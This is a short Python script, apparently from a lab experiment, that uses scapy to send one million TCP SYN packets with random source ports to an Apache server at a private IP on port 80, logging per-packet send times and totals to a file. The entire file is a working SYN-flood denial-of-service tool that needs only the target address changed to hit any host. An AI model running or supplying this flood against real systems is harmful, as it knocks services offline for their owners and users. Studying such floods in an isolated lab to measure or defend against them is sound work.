from scapy.all import IP, TCP, send
import random
import time

target_ip = "192.168.6.145"  # Apache server IP
target_port = 80             # Apache default port

log_file = open("syns_results_p.txt", "w")
packet_count = 1_000_000

start_all = time.time()  # Record full run start time

def send_syn(i):
    ip = IP(dst=target_ip)
    tcp = TCP(
        sport=random.randint(1024, 65535),
        dport=target_port,
        flags="S",
        seq=random.randint(1000, 9000)
    )
    packet = ip / tcp

    start = time.time()
    send(packet, verbose=0)
    end = time.time()

    send_time_microseconds = int((end - start) * 1_000_000)
    log_file.write(f"{i + 1} {send_time_microseconds}\n")


# Send packets in a loop
for i in range(packet_count):
    send_syn(i)

end_all = time.time()
total_time_us = int((end_all - start_all) * 1_000_000)
avg_time_us = total_time_us // packet_count

# Write total and average to file
log_file.write(f"Total time: {total_time_us} microseconds\n")
log_file.write(f"Average time: {avg_time_us} microseconds\n")
log_file.close()

print(f"Done sending {packet_count} packets. Results saved to syns_results_p.txt")
